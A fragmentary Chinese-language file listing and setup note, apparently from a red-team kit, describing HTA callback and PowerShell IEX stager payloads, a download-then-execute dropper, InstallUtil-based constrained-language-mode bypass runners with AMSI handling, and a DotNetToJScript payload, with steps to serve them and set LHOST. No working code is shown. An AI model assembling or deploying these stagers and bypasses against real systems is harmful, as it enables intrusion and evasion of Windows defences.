...
1. 搭静态服务器与监听：
   ...
   cp <本项目>/m02-hta-callback.hta ./ok.hta
   cp <本项目>/m02-hta-powershell-stager.hta ./stager.hta
...
注意：内嵌 C# 与 m02-clm-bypass-runspace.cs 逻辑一致；改动其一请同步另一份
-->
<html>
<head>
<title>Loading</title>
...
| `m02-clm-bypass-runspace.cs` | InstallUtil 兼容 runner（自定义 Runspace + AMSI 处理） | 替换 `LHOST` 后编译 x86/x64 |
...
- `m02-hta-callback.hta` —— 最小 HTA 回调（场景 6/7/8 共用第一步）
- `m02-hta-powershell-stager.hta` —— HTA→PowerShell IEX 拉第二阶段（场景 6；场景 8 的"合并形态"对照）
- `m02-hta-download-exec-split.hta` —— 下载/执行分离两阶段 + 文件检查 + 进度回显（场景 8）
- `m02-hta-embedded-clm-bypass.hta` —— 内嵌 C# 现编现跑 + InstallUtil /U + 自定义 Runspace（场景 7，单文件）
- `m02-clm-bypass-runspace.cs` —— InstallUtil 兼容 runner：自定义 Runspace + AMSI 处理 + IEX（场景 6/7）
- `m02-clm-bypass-dotnettojscript.cs` —— DotNetToJScript 载荷类，无 EXE/无 InstallUtil 备选（场景 7）
